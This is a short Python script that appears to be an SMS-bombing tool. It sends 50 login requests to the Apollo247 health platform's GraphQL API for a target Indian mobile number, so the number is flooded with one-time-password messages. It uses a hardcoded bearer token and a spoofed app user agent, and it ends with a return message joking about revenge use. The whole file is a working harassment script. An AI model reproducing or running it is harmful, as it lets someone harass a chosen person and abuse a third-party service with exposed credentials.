import requests
import time

header= {
    "accept": "*/*",
    "authorization": "Bearer 3d1833da7020e0602165529446587434",
    "Content-Type": "application/json",
    "Host": "api.apollo247.com",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "User-Agent": "okhttp/3.12.1",
    "Content-Length": "357"}    

url='https://api.apollo247.com//graphql'   

def main(num):
	
	for i in range(50):
		try:
			req=requests.post(url,json={"operationName":"Login","variables":{"mobileNumber":"+91"+str(num),"loginType":"PATIENT","hashCode":"XZNKZ3TUKDO"},"query":"query Login($mobileNumber: String!, $loginType: LOGIN_TYPE!, $hashCode: String) {\n  login(mobileNumber: $mobileNumber, loginType: $loginType, hashCode: $hashCode) {\n    status\n    message\n    loginId\n    __typename\n  }\n}\n"}  ,headers=header)
			time.sleep(0.3)
		except Exception as e:
			pass
			
	return '50 Sent succesfully\nPlease dont use it for revenge purposes'
	

		
		
		

	